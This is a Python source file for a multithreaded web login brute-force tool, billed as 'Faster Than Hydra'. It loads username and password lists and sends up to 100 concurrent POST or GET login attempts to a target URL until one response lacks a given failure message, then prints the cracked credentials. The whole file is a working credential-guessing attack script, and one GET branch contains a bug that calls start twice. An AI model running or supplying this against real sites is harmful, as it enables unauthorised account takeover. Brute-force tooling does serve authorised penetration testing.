import argparse
import requests
import os
import sys
import signal
import time
import threading
from termcolor import colored

def max_threads(x):
    x = int(x)
    if x > 100:
        raise argparse.ArgumentTypeError("Maxmimum Threads is 100")
    return x

parser = argparse.ArgumentParser(description='Web Post/Get Brute Force | Coded By https://github.com/rootkral4')
parser.add_argument('-u', "--url", required=True, help="URL (https://example.com/login)", type=str)
parser.add_argument('-l', "--login", required=True, help="Username Path", type=str)
parser.add_argument('-p', "--password", required=True, help="Password Path", type=str)
parser.add_argument('-d', "--data", required=True, help="Request Payload:wrong message", type=str)
parser.add_argument('-m', "--method", choices=['post', 'get'], required=True,  help="POST/GET", type=str)
parser.add_argument('-t', "--threads", required=False, help="Threads Default 50", default=50, type=max_threads)
parser.add_argument('-v', "--verbose", required=False, help="Verbose", action='store_true')

args = parser.parse_args()
attackurl = getattr(args,'url')
userlist = getattr(args,'login')
passlist = getattr(args,'password')
attacktype = getattr(args,'method')
payload = getattr(args,"data")
verbose = getattr(args,'verbose')
threads = getattr(args,'threads')

payload = payload.split(":")
wrongmessage = payload[1]
reqpayload = payload[0]
reqpayload = reqpayload.split("&")

def signal_handler(sig, frame):
    print(colored('Exiting please wait while im fucking up those threads bye...', "blue"))
    sys.exit(0)
signal.signal(signal.SIGINT, signal_handler)


if os.path.isfile(userlist):
    print(colored("[READ] Reading File {}".format(userlist), "yellow"))
    with open(userlist, "r", errors='ignore') as f:
        users = f.readlines()
    print(colored("[READ] Done {}".format(userlist), "yellow"))
else:
    users = ([userlist])

if os.path.isfile(passlist):
    print(colored("[READ] Reading File {}".format(passlist), "yellow"))
    with open(passlist, "r", errors='replace') as f:
        passwords = f.readlines()
    print(colored("[READ] Done {}".format(passlist), "yellow"))
else:
    passwords = ([passlist])

    
def sendpostrequest(attackurl, param1, param2, user, pwd, wrongmessage, starttime):
    r = requests.post(attackurl, data={reqpayload[0]: user, reqpayload[1]: pwd})
    if wrongmessage not in r.content.decode():
        print(colored("\n[FOUND] User :{} Password :{}".format(user, pwd), "green"))
        print("Took", time.time() - starttime, "seconds")
        os.kill(os.getpid(), signal.SIGINT)
    return


def sendgetrequest(attackurl, param1, param2, user, pwd, wrongmessage, starttime):
    r = requests.get(attackurl, params={reqpayload[0]: user, reqpayload[1]: pwd})
    if wrongmessage not in r.content.decode():
        print(colored("\n[FOUND] User :{} Password :{}".format(user, pwd), "green"))
        print("Took", time.time() - starttime, "seconds")
        os.kill(os.getpid(), signal.SIGINT)
    return


print(colored("👑 Faster Than Hydra 👑", "green"))
print(colored("-" * 40, "magenta"))
print(colored("Url              :" + attackurl, "green"))
print(colored("Users Loaded     :" + str(len(users)), "green"))
print(colored("Passwords Loaded :" + str(len(passwords)), "green"))
print(colored("Wrong Message    :" + wrongmessage, "green"))
print(colored("Attack Type      :" + attacktype, "green"))
print(colored("Request Payload  :" + reqpayload[0] + "," + reqpayload[1], "green"))
print(colored("Verbose          :" + str(verbose), "green"))
print(colored("Threads          :" + str(threads), "green"))
print(colored("-" * 40, "magenta"))
print(colored("rootkral4 | https://github.com/rootkral4","green"))

starttime = time.time()

if verbose == True:
    linecounter = 0
    if attacktype == "post":
        for user in users:
            for pwd in passwords:
                user = user.strip()
                pwd = pwd.strip()
                print("[TRY] User :{} Password :{} Host :{} Line :{}".format(user, pwd, attackurl, linecounter))
                while threading.activeCount() > threads:
                    time.sleep(0.1)
                threading.Thread(target=sendpostrequest, args=(attackurl, reqpayload[0], reqpayload[1], user, pwd, wrongmessage, starttime)).start()
                linecounter += 1
    else:
        for user in users:
            for pwd in passwords:
                user = user.strip()
                pwd = pwd.strip()
                print("[TRY] User :{} Password :{} Host :{} Line :{}".format(user, pwd, attackurl, linecounter))
                while threading.activeCount() > threads:
                    time.sleep(0.1)
                threading.Thread(target=sendgetrequest, args=(attackurl, reqpayload[0], reqpayload[1], user, pwd, wrongmessage, starttime)).start()
                linecounter += 1
else:
    print(colored("[INFO] Started","green"))
    if attacktype == "post":
        for user in users:
            for pwd in passwords:
                user = user.strip()
                pwd = pwd.strip()
                while threading.activeCount() > threads:
                    time.sleep(0.1)
                thread = threading.Thread(target=sendpostrequest, args=(attackurl, reqpayload[0], reqpayload[1], user, pwd, wrongmessage, starttime))
                thread.start()
    else:
        for user in users:
            for pwd in passwords:
                user = user.strip()
                pwd = pwd.strip()
                while threading.activeCount() > threads:
                    time.sleep(0.1)
                thread = threading.Thread(target=sendgetrequest, args=(attackurl, reqpayload[0], reqpayload[1], user, pwd, wrongmessage, starttime)).start()
                thread.start() 
                

print("[NONE] Found 0 Match Check Request Payload")

